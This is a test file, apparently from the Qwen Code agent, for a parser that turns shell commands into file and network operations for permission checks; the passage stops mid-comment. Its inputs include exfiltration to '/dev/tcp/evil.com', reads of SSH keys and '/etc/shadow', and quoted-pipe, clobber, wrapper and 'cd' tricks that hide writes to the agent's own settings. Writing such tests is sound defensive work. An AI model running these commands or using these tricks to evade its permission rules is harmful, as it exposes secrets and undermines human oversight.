/**
 * @license
 * Copyright 2025 Qwen team
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, it, expect } from 'vitest';
import os from 'node:os';
import {
  extractShellOperations,
  extractShellOperationsAcrossCommand,
} from './shell-semantics.js';
import type { ShellOperation } from './shell-semantics.js';

const CWD = '/home/user/project';
const SETTINGS = `${CWD}/.qwen/settings.json`;
const REPO_SETTINGS = '/repo/.qwen/settings.json';

// Helper: sort ops for stable comparison
function sorted(ops: ShellOperation[]) {
  return [...ops].sort((a, b) =>
    `${a.virtualTool}:${a.filePath ?? ''}:${a.domain ?? ''}`.localeCompare(
      `${b.virtualTool}:${b.filePath ?? ''}:${b.domain ?? ''}`,
    ),
  );
}

const fileOp =
  (virtualTool: ShellOperation['virtualTool']) =>
  (filePath: string): ShellOperation => ({ virtualTool, filePath });
const read = fileOp('read_file');
const write = fileOp('write_file');
const edit = fileOp('edit');
const dir = fileOp('list_directory');
const web = (domain: string): ShellOperation => ({
  virtualTool: 'web_fetch',
  domain,
});
/** A write whose path was resolved against a cwd the analysis cannot know. */
const uncertainWrite = (
  filePath: string,
  pathMayDependOnCwd = true,
): ShellOperation => ({
  virtualTool: 'write_file',
  filePath,
  cwdUnknown: true,
  pathMayDependOnCwd,
});
const ops = (command: string) => extractShellOperations(command, CWD);
const across = (command: string) =>
  extractShellOperationsAcrossCommand(command, '/repo');
const expectSorted = (command: string, expected: ShellOperation[]) =>
  expect(sorted(ops(command))).toEqual(expected);
type Row = [title: string, command: string, expected: ShellOperation[]];

describe('extractShellOperations', () => {
  it.each<Row>([
    ['returns [] for empty string', '', []],
    ['returns [] for whitespace', '   ', []],
    ['returns [] for unknown commands', 'frobnicate /etc/passwd', []],
    ['returns [] for env-var assignments', 'FOO=bar', []],
    ['cat: absolute path', 'cat /etc/passwd', [read('/etc/passwd')]],
    [
      'cat: relative path resolved against cwd',
      'cat secrets.txt',
      [read(`${CWD}/secrets.txt`)],
    ],
    ['cat: flags are ignored', 'cat -n /etc/hosts', [read('/etc/hosts')]],
    [
      'cat: quoted path',
      "cat '/etc/my file.conf'",
      [read('/etc/my file.conf')],
    ],
    [
      'head: -n value not treated as path',
      'head -n 10 /var/log/syslog',
      [read('/var/log/syslog')],
    ],
    [
      'grep: first positional is pattern, rest are files',
      'grep password /etc/shadow',
      [read('/etc/shadow')],
    ],
    ['grep: -r becomes list_directory', 'grep -r secret /etc', [dir('/etc')]],
    // -f consumes patterns.txt and sets hasPatternFlag, so every positional
    // is a file path (no slice(1)).
    [
      'grep: -f patternfile — positionals are file paths',
      'grep -f patterns.txt /etc/hosts',
      [read('/etc/hosts')],
    ],
    [
      'grep: -n is line numbers and does not consume the pattern',
      'grep -n pattern /etc/hosts',
      [read('/etc/hosts')],
    ],
    [
      'grep: -A value not treated as path',
      'grep -A 3 error /var/log/app.log',
      [read('/var/log/app.log')],
    ],
    ['ls: no args defaults to cwd', 'ls', [dir(CWD)]],
    ['ls: explicit dir', 'ls /var/log', [dir('/var/log')]],
    [
      'find: first positional is starting dir',
      'find /etc -name "*.conf"',
      [dir('/etc')],
    ],
    ['find: no starting dir defaults to cwd', 'find -name "*.txt"', [dir(CWD)]],
    [
      'find: extracts write ops from exec clauses',
      'find . -exec cp payload .qwen/settings.json ;',
      [dir(CWD), read(`${CWD}/payload`), write(SETTINGS)],
    ],
    [
      'touch: creates a file (write_file)',
      'touch /tmp/new.txt',
      [write('/tmp/new.txt')],
    ],
    [
      'mkdir: creates a directory (write_file)',
      'mkdir -p /tmp/a/b',
      [write('/tmp/a/b')],
    ],
    [
      'rm: single file is edit',
      'rm /tmp/secret.txt',
      [edit('/tmp/secret.txt')],
    ],
    ['rm -rf: directory is edit', 'rm -rf /tmp/dir', [edit('/tmp/dir')]],
    [
      'chmod: mode arg is skipped, file is edit',
      'chmod 755 /usr/local/bin/script',
      [edit('/usr/local/bin/script')],
    ],
    [
      'chown: owner arg is skipped, file is edit',
      'chown root:root /etc/config',
      [edit('/etc/config')],
    ],
    [
      'sed without -i: read_file',
      "sed 's/foo/bar/' /etc/hosts",
      [read('/etc/hosts')],
    ],
    ['sed -i: edit', "sed -i 's/foo/bar/' /etc/hosts", [edit('/etc/hosts')]],
    [
      'sed combined short flags containing i: edit',
      "sed -nie 's/foo/bar/' /etc/hosts",
      [edit('/etc/hosts')],
    ],
    [
      'awk: program expression filtered, file identified',
      "awk '{print $1}' /etc/passwd",
      [read('/etc/passwd')],
    ],
    [
      'awk -F: separator consumed, file identified',
      "awk -F: '{print $2}' /etc/shadow",
      [read('/etc/shadow')],
    ],
    [
      'awk -i inplace: edits files in place',
      'awk -i inplace \'{gsub(/x/, "y")}1\' /etc/hosts',
      [edit('/etc/hosts')],
    ],
    [
      'awk --include=inplace: edits files in place',
      'awk --include=inplace \'{gsub(/x/, "y")}1\' /etc/hosts',
      [edit('/etc/hosts')],
    ],
    [
      'gawk -i inplace: edits files in place',
      'gawk -i inplace \'{gsub(/x/, "y")}1\' /etc/hosts',
      [edit('/etc/hosts')],
    ],
    [
      'redirect >: write_file',
      'echo hello > /tmp/out.txt',
      [write('/tmp/out.txt')],
    ],
    [
      'redirect >>: write_file',
      'date >> /var/log/app.log',
      [write('/var/log/app.log')],
    ],
    // `>|` is the clobber override: the same write as `>`, spelled to defeat
    // `noclobber`. Not reading it loses a write to a protected path.
    [
      'redirect >|: write_file',
      'echo hello >| /tmp/out.txt',
      [write('/tmp/out.txt')],
    ],
    [
      'redirect >| without space: write_file',
      'echo hello >|/tmp/out.txt',
      [write('/tmp/out.txt')],
    ],
    [
      'redirect 1>|: write_file',
      'echo hello 1>| /tmp/out.txt',
      [write('/tmp/out.txt')],
    ],
    [
      'redirect 1>| without space: write_file',
      'echo hello 1>|/tmp/out.txt',
      [write('/tmp/out.txt')],
    ],
    [
      'redirect 2>|: write_file',
      'echo hi 2>| /tmp/err.txt',
      [write('/tmp/err.txt')],
    ],
    [
      'redirect 2>| without space: write_file',
      'echo hi 2>|/tmp/err.txt',
      [write('/tmp/err.txt')],
    ],
    [
      'redirect >|: quoted target',
      "echo hello >| '/tmp/my file.txt'",
      [write('/tmp/my file.txt')],
    ],
    [
      'redirect >|: network pseudo-device opens no file',
      'echo hello >| /dev/tcp/example.com/80',
      [],
    ],
    [
      'redirect >|: a quoted operator stays a literal argument',
      'echo "hi >| nope.txt"',
      [],
    ],
    // A `|` inside the operator is a literal filename character, not a shell
    // pipe: `>"|"file` writes a file called `|file`, and `>"|" out.txt` writes a
    // file called `|`. Masking `|` along with `<>&` keeps the quoted forms on
    // the plain `>` branch (base parity) instead of reading them as `>|` and
    // dropping the leading `|` from the reported target.
    [
      'redirect: a quoted pipe in the target is part of the filename',
      'echo \'{}\' >"|"file',
      [write(`${CWD}/|file`)],
    ],
    [
      'redirect: a quoted pipe standing alone names the file',
      'echo hi >"|" out.txt',
      [write(`${CWD}/|`)],
    ],
    [
      'redirect: an escaped pipe in the target is part of the filename',
      'echo hi >\\|file',
      [write(`${CWD}/|file`)],
    ],
    [
      'redirect: a quoted pipe plus .. cannot climb out of a denied path',
      'echo \'{}\' >"|/../".qwen/settings.json',
      [write(SETTINGS)],
    ],
    // The other spellings: a single-quoted `|` keeps `|x/` in the resolved
    // path, and a quoted word ending in `>` must not turn the plain redirect
    // that follows it into a clobber.
    [
      'redirect: a single-quoted pipe is part of the filename',
      "echo '{}' >'|x/'.qwen/settings.json",
      [write(`${CWD}/|x/.qwen/settings.json`)],
    ],
    [
      'redirect: a quoted word before the redirect does not invent a clobber',
      'echo hi \'>\'>"|/../".qwen/settings.json',
      [write(SETTINGS)],
    ],
    [
      'curl: extracts domain',
      'curl https://api.example.com/data',
      [web('api.example.com')],
    ],
    [
      'wget: extracts domain',
      'wget https://example.com/file.tar.gz',
      [web('example.com')],
    ],
    [
      'sudo cat: transparent wrapper',
      'sudo cat /etc/sudoers',
      [read('/etc/sudoers')],
    ],
    [
      'sudo -u user cat: strips flags before inner cmd',
      'sudo -u root cat /etc/shadow',
      [read('/etc/shadow')],
    ],
    [
      'env cmd: transparent wrapper',
      'env cat /etc/hosts',
      [read('/etc/hosts')],
    ],
    [
      'timeout cmd: transparent wrapper',
      'timeout 30 wget https://example.com',
      [web('example.com')],
    ],
    // $SECRET_FILE starts with $, filtered by looksLikePath
    ['$VAR paths are not included', 'cat $SECRET_FILE', []],
  ])('%s', (_title, command, expected) => {
    expect(ops(command)).toEqual(expected);
  });

  const curlOut = [web('api.example.com'), write('/tmp/out.json')];
  const wgetOut = [web('example.com'), write('/tmp/file.gz')];
  it.each<Row>([
    ['cat: multiple files', 'cat /a/b /c/d', [read('/a/b'), read('/c/d')]],
    [
      'tail: multiple files with flag',
      'tail -c 100 /a /b',
      [read('/a'), read('/b')],
    ],
    ['diff: two files', 'diff /old /new', [read('/new'), read('/old')]],
    [
      'grep: -e flag shifts all positionals to paths',
      'grep -e password /etc/passwd /etc/shadow',
      [read('/etc/passwd'), read('/etc/shadow')],
    ],
    [
      'cp: src=read, dst=write',
      'cp /etc/passwd /tmp/backup',
      [read('/etc/passwd'), write('/tmp/backup')],
    ],
    [
      'mv: src=edit, dst=write',
      'mv /tmp/a /tmp/b',
      [edit('/tmp/a'), write('/tmp/b')],
    ],
    [
      'sed -e: all positionals are files',
      "sed -e 's/foo/bar/' /a /b",
      [read('/a'), read('/b')],
    ],
    [
      'dd if= and of=',
      'dd if=/dev/sda of=/tmp/disk.img',
      [read('/dev/sda'), write('/tmp/disk.img')],
    ],
    [
      'rsync destination is a write',
      'rsync /tmp/payload .qwen/settings.json',
      [read('/tmp/payload'), write(SETTINGS)],
    ],
    [
      'curl: -o flag value emits write op and is not treated as URL',
      'curl -o /tmp/out.json https://api.example.com',
      curlOut,
    ],
    [
      'curl: attached -o flag value emits write op',
      'curl -o/tmp/out.json https://api.example.com',
      curlOut,
    ],
    [
      'curl: attached -o= flag value emits write op',
      'curl -o=/tmp/out.json https://api.example.com',
      curlOut,
    ],
    [
      'wget: -O flag value emits write op and is not treated as URL',
      'wget -O /tmp/file.gz https://example.com/f.gz',
      wgetOut,
    ],
    [
      'wget: attached -O flag value emits write op',
      'wget -O/tmp/file.gz https://example.com/f.gz',
      wgetOut,
    ],
    [
      'wget: attached -O= flag value emits write op',
      'wget -O=/tmp/file.gz https://example.com/f.gz',
      wgetOut,
    ],
    [
      'cat src > dst: both read and write',
      'cat /etc/passwd > /tmp/copy',
      [read('/etc/passwd'), write('/tmp/copy')],
    ],
    [
      'grep pattern file > out: read + write',
      'grep secret /etc/config > /tmp/out',
      [read('/etc/config'), write('/tmp/out')],
    ],
  ])('%s', (_title, command, expected) => {
    expectSorted(command, expected);
  });

  it.each<[title: string, command: string, expected: ShellOperation]>([
    [
      'find: preserves exec placeholder operands for write detection',
      'find . -exec cp {} .qwen/settings.json ;',
      write(SETTINGS),
    ],
    [
      'patch edits positional target files',
      'patch .qwen/settings.json fix.patch',
      edit(SETTINGS),
    ],
    ['redirect <: read_file', 'sort < /tmp/data.txt', read('/tmp/data.txt')],
    [
      'combined redirect >file without space',
      'echo hi >/tmp/foo',
      write('/tmp/foo'),
    ],
    [
      'combined stdout fd redirect 1>file without space',
      'echo hi 1>.qwen/settings.json',
      write(SETTINGS),
    ],
    [
      'combined stdout fd append redirect 1>>file without space',
      'echo hi 1>>.qwen/settings.json',
      write(SETTINGS),
    ],
  ])('%s', (_title, command, expected) => {
    expect(ops(command)).toContainEqual(expected);
  });

  // Device paths are never file operations; each row lists what must be
  // absent and, where a real file is also named, the op still reported.
  it.each<
    [
      title: string,
      command: string,
      absent: Array<Partial<ShellOperation>>,
      present?: ShellOperation,
    ]
  >([
    [
      'redirect 2>/dev/null: ignored (no op)',
      'cat /etc/passwd 2>/dev/null',
      [{ filePath: '/dev/null' }],
      read('/etc/passwd'),
    ],
    [
      'redirect > /dev/tcp: network socket, not a file write',
      'echo data > /dev/tcp/evil.com/9000',
      [{ filePath: '/dev/tcp/evil.com/9000' }, { virtualTool: 'write_file' }],
    ],
    [
      'redirect < /dev/tcp: network socket, not a file read',
      'cat < /dev/tcp/h/1234',
      [{ filePath: '/dev/tcp/h/1234' }, { virtualTool: 'read_file' }],
    ],
    [
      'redirect > /dev/udp: network socket, not a file write',
      'echo x > /dev/udp/h/53',
      [{ filePath: '/dev/udp/h/53' }],
    ],
    [
      'combined redirect >/dev/tcp without space: network socket, not a file',
      'cat /tmp/secret >/dev/tcp/h/p',
      [{ filePath: '/dev/tcp/h/p' }],
      read('/tmp/secret'),
    ],
  ])('%s', (_title, command, absent, present) => {
    const result = ops(command);
    for (const shape of absent) {
      expect(result).not.toContainEqual(expect.objectContaining(shape));
    }
    if (present) expect(result).toContainEqual(present);
  });

  it('cat: ~ expansion', () => {
    expect(ops('cat ~/.ssh/id_rsa')[0]?.filePath).toMatch(/\/\.ssh\/id_rsa$/);
  });

  it('cp/mv/install/ln -t forms emit target-directory writes', () => {
    expectSorted('cp -t .qwen /tmp/settings.json', [
      read('/tmp/settings.json'),
      write(SETTINGS),
    ]);
    expectSorted('mv --target-directory=.qwen /tmp/a', [
      edit('/tmp/a'),
      write(`${CWD}/.qwen/a`),
    ]);
    expectSorted('install -t .qwen /tmp/tool', [
      read('/tmp/tool'),
      write(`${CWD}/.qwen/tool`),
    ]);
    expectSorted('ln -t .qwen /tmp/target', [
      read('/tmp/target'),
      write(`${CWD}/.qwen/target`),
    ]);
    expectSorted('cp -rt .qwen /tmp/payload', [
      read('/tmp/payload'),
      write(`${CWD}/.qwen/payload`),
    ]);
  });

  it('perl -i edits file operands', () => {
    expect(ops("perl -i -pe 's/x/y/' .qwen/settings.json")).toEqual([
      edit(SETTINGS),
    ]);
    expect(ops("perl -i -e 's/x/y/' .qwen/settings.json")).toEqual([
      edit(SETTINGS),
    ]);
  });

  it('patch edits output flag targets', () => {
    for (const command of [
      'patch --output=.qwen/settings.json -i fix.patch',
      'patch -o .qwen/settings.json -i fix.patch',
    ]) {
      expect(ops(command)).toContainEqual(edit(SETTINGS));
    }
  });

  it('sort -o emits the output path as a write', () => {
    expectSorted('sort -o .qwen/settings.json /tmp/in', [
      read('/tmp/in'),
      write(SETTINGS),
    ]);
    expectSorted('sort --output=.qwen/settings.json /tmp/in', [
      read('/tmp/in'),
      write(SETTINGS),
    ]);
  });

  // `N>&M`, `>&M`, `N<&M` and `N>&-` duplicate or close a descriptor; bash
  // opens no file. They used to come back as a write to `<cwd>/&1`, which a
  // bare Edit/Write deny (the headless -p default) turned into a denial.
  it.each<[command: string, expected: ShellOperation[]]>([
    ['df -hT / 2>&1', []],
    ['df -hT / 1>&2', []],
    ['df -hT / >&2', []],
    ['df -hT / 2>&-', []],
    ['df -hT / >&-', []],
    ['cat <&0', []],
    ['df -hT / 2>&1 | head -5', []],
    ['df -hT / >&"1"', []],
    ['cat /etc/hosts 2>&1', [read('/etc/hosts')]],
    ['echo hi > out.txt 2>&1', [write(`${CWD}/out.txt`)]],
    ['echo hi 2>&1 >out.txt', [write(`${CWD}/out.txt`)]],
  ])('fd duplication is not a file operation: %s', (command, expected) => {
    expectSorted(command, expected);
  });

  it('>&file and 1>&file write the named file, not "&file"', () => {
    expect(ops('echo hi >&.qwen/settings.json')).toEqual([write(SETTINGS)]);
    expect(ops('echo hi 1>&.qwen/settings.json')).toEqual([write(SETTINGS)]);
  });

  // Bash writes a file named `&1` when the `&` is quoted or escaped.
  it.each<[command: string, file: string]>([
    ['printf TXT >"&1"', '&1'],
    ["printf TXT >'&1'", '&1'],
    ['printf TXT >\\&1', '&1'],
    ['printf TXT 2>"&1"', '&1'],
    ['printf TXT >"&"1', '&1'],
    ['printf TXT >"&protected.txt"', '&protected.txt'],
    ['printf TXT >\\&protected.txt', '&protected.txt'],
    ['printf TXT >"x&"', 'x&'],
    ['printf TXT >"notes)"', 'notes)'],
    ["printf TXT >'notes)'", 'notes)'],
    ['printf TXT >notes\\)', 'notes)'],
    ['printf TXT >"&"', '&'],
    ['printf TXT >\\&', '&'],
  ])('quoted or escaped & is part of the file name: %s', (command, file) => {
    expect(ops(command)).toEqual([write(`${CWD}/${file}`)]);
  });

  it('>&$VAR keeps an unresolved write: it may name a file', () => {
    expect(ops('printf TXT >&$OUT')).toEqual([
      { ...write(`${CWD}/&$OUT`), pathUnknown: true },
    ]);
  });

  // Only a whole number or `-` is a descriptor; anything else names a file.
  // (`2>&file` and `<&file` are errors in bash; reporting them keeps the
  // check strict.)
  it.each<[command: string, expected: ShellOperation[]]>([
    ['printf TXT >&1.log', [write(`${CWD}/1.log`)]],
    ['printf TXT >&2fa-notes.md', [write(`${CWD}/2fa-notes.md`)]],
    ['printf TXT 2>&protected.txt', [write(`${CWD}/protected.txt`)]],
    ['cat <&protected.txt', [read(`${CWD}/protected.txt`)]],
    ['printf TXT >&"y)"', [write(`${CWD}/y)`)]],
  ])('fd redirect word: %s', (command, expected) => {
    expectSorted(command, expected);
  });

  // After an unquoted `>&`, `N>&` or `<&`, bash reads an unquoted `-` as
  // "close" and starts a new word: `rm >&-notes.txt` closes stdout and
  // removes notes.txt. The command gets that word as an argument, and the
  // whole word also stays a file operation (`&-word`), because the parser
  // doesn't know every command and drops numbers and `$` words as arguments:
  // `tee >&-2` writes `2`, `my-tool >&-notes.txt` may write notes.txt.
  it.each<[command: string, expected: ShellOperation[]]>([
    [
      'rm >&-notes.txt',
      [edit(`${CWD}/notes.txt`), write(`${CWD}/&-notes.txt`)],
    ],
    [
      'rm 1>&-notes.txt',
      [edit(`${CWD}/notes.txt`), write(`${CWD}/&-notes.txt`)],
    ],
    [
      'rm 2>&-notes.txt',
      [edit(`${CWD}/notes.txt`), write(`${CWD}/&-notes.txt`)],
    ],
    ['rm <&-notes.txt', [edit(`${CWD}/notes.txt`), read(`${CWD}/&-notes.txt`)]],
    [
      'rm >&-"notes.txt"',
      [edit(`${CWD}/notes.txt`), write(`${CWD}/&-notes.txt`)],
    ],
    [
      'cat <&-notes.txt',
      [read(`${CWD}/&-notes.txt`), read(`${CWD}/notes.txt`)],
    ],
    ['printf TXT >&-x', [write(`${CWD}/&-x`)]],
    ['tee >&-2', [write(`${CWD}/&-2`)]],
    ['tee 2>&-2', [write(`${CWD}/&-2`)]],
    ['cat <&-2', [read(`${CWD}/&-2`)]],
    [
      'tee >&-$HOME/.bashrc',
      [{ ...write(`${CWD}/&-$HOME/.bashrc`), pathUnknown: true }],
    ],
    [
      'tee >&-{a,b}',
      sorted([
        { ...write(`${CWD}/&-{a,b}`), pathUnknown: true },
        { ...write(`${CWD}/{a,b}`), pathUnknown: true },
      ]),
    ],
    ['my-tool >&-notes.txt', [write(`${CWD}/&-notes.txt`)]],
    ['rm -- >&--x', [write(`${CWD}/&--x`)]],
    ['printf X >&->&"-x"', [write(`${CWD}/-x`), write(`${CWD}/&->&-x`)]],
    // A closed descriptor can close again: each `>&-` starts a new word, and
    // only the first redirect reports the whole word.
    [
      'rm >&->&-notes.txt',
      [edit(`${CWD}/notes.txt`), write(`${CWD}/&->&-notes.txt`)],
    ],
    [
      'rm >&-<&-notes.txt',
      [edit(`${CWD}/notes.txt`), write(`${CWD}/&-<&-notes.txt`)],
    ],
    [
      'rm >&-2>&-notes.txt',
      [edit(`${CWD}/notes.txt`), write(`${CWD}/&-2>&-notes.txt`)],
    ],
    ['printf X >&->&-', [write(`${CWD}/&->&-`)]],
    ['tee >&->&y', [write(`${CWD}/&->&y`), write(`${CWD}/y`)]],
    ['df -hT / >&-', []],
    ['df -hT / >&"-"', []],
  ])('unquoted - closes the descriptor: %s', (command, expected) => {
    expectSorted(command, expected);
  });

  // A long chain of closes in one word is walked in a loop: it must not
  // overflow the stack, and the whole word is reported once.
  it.each(['>&-', '<&-', '2>&-'])('a long chain of %s returns', (unit) => {
    const command = `rm ${unit.repeat(20000)}notes.txt`;
    const result = ops(command);
    expect(result).toHaveLength(2);
    expect(result).toContainEqual(edit(`${CWD}/notes.txt`));
  });

  // A quoted or escaped `)` is part of the word; a bare one closes a subshell.
  it.each<[command: string, expected: ShellOperation[]]>([
    ['(echo hi >out.txt)', [write(`${CWD}/out.txt`)]],
    ['(echo hi > out.txt)', [write(`${CWD}/out.txt`)]],
    ['cat "notes)"', [read(`${CWD}/notes)`)]],
    ['rm notes\\)', [edit(`${CWD}/notes)`)]],
  ])('trailing ): %s', (command, expected) => {
    expectSorted(command, expected);
  });

  // `>&` and `<&` aimed at a device: bash discards the output or opens a
  // socket, so no file operation.
  it.each<string>([
    'df -hT / >&/dev/null',
    'df -hT / 1>&/dev/null',
    'cat <&/dev/null',
    'printf TXT >&/dev/tcp/127.0.0.1/80',
  ])('fd redirect to a device is not a file operation: %s', (command) => {
    expectSorted(command, []);
  });

  // A quoted `>` is not a redirect, so `2">"&1` is not fd duplication; bash
  // reads the unquoted `&` as "run in background" and then runs `1`, so no
  // file is written.
  it('2">"&1 is not fd duplication', () => {
    expect(ops('printf X 2">"&1')).toEqual([]);
  });

  // A quoted or escaped `>` ends the word; an adjacent unquoted `>` is still
  // a redirect: `echo x '>'>file` passes `>` to echo and writes `file`.
  it.each<[command: string, file: string]>([
    ["echo x '>'>.qwen/settings.json", '.qwen/settings.json'],
    ['echo x \\>>out2.txt', 'out2.txt'],
    ['echo x ">">out3.txt', 'out3.txt'],
    ["echo x $'\\x3e'>out4.txt", 'out4.txt'],
    ["echo x '&'>out5.txt", 'out5.txt'],
    ['echo x "&">>out6.txt', 'out6.txt'],
    ['echo x \\&>out7.txt', 'out7.txt'],
    ["echo x $'\\x26'>out8.txt", 'out8.txt'],
    ["echo x '>'&>out9.txt", 'out9.txt'],
    ['echo x "&"&>out10.txt', 'out10.txt'],
    // `|` belongs to the same set: a quoted or escaped pipe ends the word and
    // the adjacent unquoted `>` is still a redirect. Without it bash wrote the
    // file while the analysis reported nothing at all.
    ['echo x "|">out11.txt', 'out11.txt'],
    ["echo x '|'>out12.txt", 'out12.txt'],
    ['echo x \\|>out13.txt', 'out13.txt'],
    ['echo \'{}\' "|">.qwen/settings.json', '.qwen/settings.json'],
  ])(
    'a quoted operator before a real redirect keeps the write: %s',
    (command, file) => {
      expect(ops(command)).toEqual([write(`${CWD}/${file}`)]);
    },
  );

  // A quoted word before a descriptor operation keeps its fd semantics.
  it('keeps fd redirects after a quoted word', () => {
    expect(ops("echo hi '>'>&1")).toEqual([]);
    expect(ops("echo hi '>'>&-")).toEqual([]);
    expect(ops("echo hi '>'>&out2.txt")).toEqual([write(`${CWD}/out2.txt`)]);
  });

  // A quoted or escaped `-` is part of the file name: `>&"-x"` writes `-x`.
  it.each<[command: string, file: string]>([
    ['printf TXT >&"-x"', '-x'],
    ["printf TXT >&'-x'", '-x'],
    ['printf TXT >&\\-x', '-x'],
    ['printf TXT 1>&"-x"', '-x'],
    ['printf TXT >&"-1"', '-1'],
    ['rm >&"-"notes.txt', '-notes.txt'],
  ])('quoted or escaped - after >& names a file: %s', (command, file) => {
    expect(ops(command)).toEqual([write(`${CWD}/${file}`)]);
  });

  it('regression: ordinary file redirects still tracked', () => {
    expect(ops('echo hi > out.txt')).toContainEqual(write(`${CWD}/out.txt`));
    expect(ops('sort < in.txt')).toContainEqual(read(`${CWD}/in.txt`));
  });
});

// Shared compound shell analysis for permission rules and AUTO review.
describe('extractShellOperationsAcrossCommand', () => {
  it.each<Row>([
    [
      'tracks literal `cd` across compound segments before resolving writes',
      "cd .qwen && bash -lc 'echo {} > settings.json'",
      [write(REPO_SETTINGS)],
    ],
    [
      'handles leading env assignments before redirected commands',
      'FOO=bar echo x > .qwen/settings.json',
      [write(REPO_SETTINGS)],
    ],
    [
      'handles leading env assignments before write commands',
      'FOO=bar tee .qwen/settings.json',
      [write(REPO_SETTINGS)],
    ],
    [
      'tracks cwd before leading env assignments',
      "cd .qwen && FOO=bar echo '{}' > settings.json",
      [write(REPO_SETTINGS)],
    ],
    // The foreground form below cannot know where it landed; the backgrounded
    // one can, because it did not move the cwd at all.
    [
      'does not mark later paths uncertain for a backgrounded dynamic `cd`',
      'cd "$TARGET" & echo {} > settings.json',
      [write('/repo/settings.json')],
    ],
    // Over-correction guards: only the backgrounded `cd` is exempt. Both of
    // these pass before and after the change.
    [
      'keeps a foreground `cd` moving the cwd',
      'cd /tmp && echo {} > settings.json',
      [write('/tmp/settings.json')],
    ],
    [
      'keeps a foreground dynamic `cd` marking later paths uncertain',
      'cd "$TARGET" && echo {} > settings.json',
      [uncertainWrite('/repo/settings.json')],
    ],
    [
      'applies a foreground `cd` that follows a backgrounded one',
      'cd /tmp & cd /var && echo {} > settings.json',
      [write('/var/settings.json')],
    ],
    // The actual write is nested two wrapper levels deep.
    [
      'recursively unwraps nested shell wrappers',
      'bash -lc "sh -c \'echo hi > .mcp.json\'"',
      [write('/repo/.mcp.json')],
    ],
    [
      'preserves sibling segments after a shell wrapper',
      "bash -lc 'echo ok' && echo hi > .qwen/settings.json",
      [write(REPO_SETTINGS)],
    ],
    [
      'splits literal newlines as command boundaries',
      'cd .qwen\ncp /tmp/malicious settings.json',
      [read('/tmp/malicious'), write(REPO_SETTINGS)],
    ],
    [
      'tracks cwd through brace-grouped commands',
      "{ cd .qwen && echo '{}' > settings.json; }",
      [write(REPO_SETTINGS)],
    ],
    [
      'strips grouping and background syntax from command and path tokens',
      '(echo > .qwen/settings.json) && echo > .qwen/hooks/run.sh&',
      [write(REPO_SETTINGS), write('/repo/.qwen/hooks/run.sh')],
    ],
    [
      'does not treat heredoc body lines as executable shell segments',
      [
        'cd .qwen',
        "cat <<'EOF'",
        'cd /tmp',
        'EOF',
        'echo > settings.json',
      ].join('\n'),
      [write(REPO_SETTINGS)],
    ],
    [
      'does not treat quoted heredoc-looking text as a heredoc marker',
      ["echo '<<EOF'", 'cd .qwen', "echo '{}' > settings.json"].join('\n'),
      [write(REPO_SETTINGS)],
    ],
    [
      'handles `cd --` and other POSIX flag forms before the target',
      "cd -- .qwen && printf '{}' > settings.local.json",
      [write('/repo/.qwen/settings.local.json')],
    ],
    [
      'treats the word after `cd --` as the target even when it starts with dash',
      "cd -- -some-dir && printf '{}' > settings.local.json",
      [write('/repo/-some-dir/settings.local.json')],
    ],
    [
      'resolves the static cwd even when the cd segment carries a >/dev/null redirect',
      "cd .qwen >/dev/null && echo '{}' > settings.json",
      [write(REPO_SETTINGS)],
    ],
    [
      'reports a redirect on a static cd segment from the starting cwd',
      "cd .qwen > settings.json && echo '{}' > settings.local.json",
      [write('/repo/settings.json'), write('/repo/.qwen/settings.local.json')],
    ],
    [
      'reports a redirect on a dynamic cd segment from the current cwd',
      'cd $TARGET > settings.json',
      [write('/repo/settings.json')],
    ],
    [
      'marks a later cd redirect as cwd-unknown after a dynamic cd',
      'cd $TARGET && cd .qwen > settings.json',
      [uncertainWrite('/repo/settings.json')],
    ],
    [
      'reports a redirect on a backgrounded cd segment without moving cwd',
      "cd .qwen > settings.json & echo '{}' > settings.local.json",
      [write('/repo/settings.json'), write('/repo/settings.local.json')],
    ],
    [
      'tracks static pushd targets like cd targets',
      "pushd .qwen && printf '{}' > settings.local.json",
      [write('/repo/.qwen/settings.local.json')],
    ],
    [
      'marks writes after popd as cwd-unknown',
      "popd && printf '{}' > settings.local.json",
      [uncertainWrite('/repo/settings.local.json')],
    ],
    [
      'marks writes after popd with expansion args as cwd-unknown',
      "popd $DIR && printf '{}' > settings.local.json",
      [uncertainWrite('/repo/settings.local.json')],
    ],
    // Keep the guessed path, but mark it unsafe to trust as final.
    [
      'marks relative writes after dynamic `cd` targets as cwd-unknown',
      'cd $TARGET && echo hi > out.txt',
      [uncertainWrite('/repo/out.txt')],
    ],
    [
      'marks all file ops after dynamic `cd` as cwd-unknown',
      'cd "$QWEN_HOME" && echo hi > ../settings.json',
      [uncertainWrite('/settings.json')],
    ],
    [
      'clears cwd-unknown after an absolute static `cd`',
      'cd $TARGET && cd /repo/.qwen && echo hi > settings.json',
      [write(REPO_SETTINGS)],
    ],
    [
      'preserves operation order across compound segments',
      'echo a > one.txt && cd sub && echo b > two.txt; cat /etc/hosts',
      [write('/repo/one.txt'), write('/repo/sub/two.txt'), read('/etc/hosts')],
    ],
    [
      'returns no ops when only `cd` segments are present',
      'cd .qwen && cd ..',
      [],
    ],
    // bash runs `echo … >| file` as ONE command. Splitting at the `|` of the
    // clobber override handed the permission path two segments and neither
    // carried the write, so a protected-path write went unseen.
    [
      'reports the clobber redirect as a write to a protected path',
      "echo '{}' >| .qwen/settings.json",
      [write(REPO_SETTINGS)],
    ],
    [
      'reports the clobber redirect without a space before the target',
      "echo '{}' >|.qwen/settings.json",
      [write(REPO_SETTINGS)],
    ],
    [
      'tracks literal `cd` before a clobber redirect',
      "cd .qwen && echo '{}' >| settings.json",
      [write(REPO_SETTINGS)],
    ],
    // A lone CR right after the clobber operator is the whole redirect target:
    // bash writes a file named `\r`, so it must not be trimmed as a line
    // ending. `1>|` and `2>|` name it exactly as `>|` does.
    [
      'reports the CR target behind `>|` as a write',
      'cat >|\r\necho hi',
      [write('/repo/\r')],
    ],
    [
      'reports the CR target behind `1>|` as a write',
      'cat 1>|\r\necho hi',
      [write('/repo/\r')],
    ],
    [
      'reports the CR target behind `2>|` as a write',
      'cat 2>|\r\necho hi',
      [write('/repo/\r')],
    ],
    [
      'still splits the real pipe that follows a clobber redirect',
      'echo hi >| out.txt | cat',
      [write('/repo/out.txt')],
    ],
    [
      'still splits the pipe after an escaped `>` (a literal argument)',
      'echo hi \\>| cat',
      [],
    ],
    [
      'still splits the pipe after a quoted clobber operator',
      "echo 'hi >| x' | cat",
      [],
    ],
  ])('%s', (_title, command, expected) => {
    expect(across(command)).toEqual(expected);
  });

  // A backgrounded `cd` runs in a subshell, so the parent's cwd is untouched
  // and the next segment's relative write lands in the *original* directory —
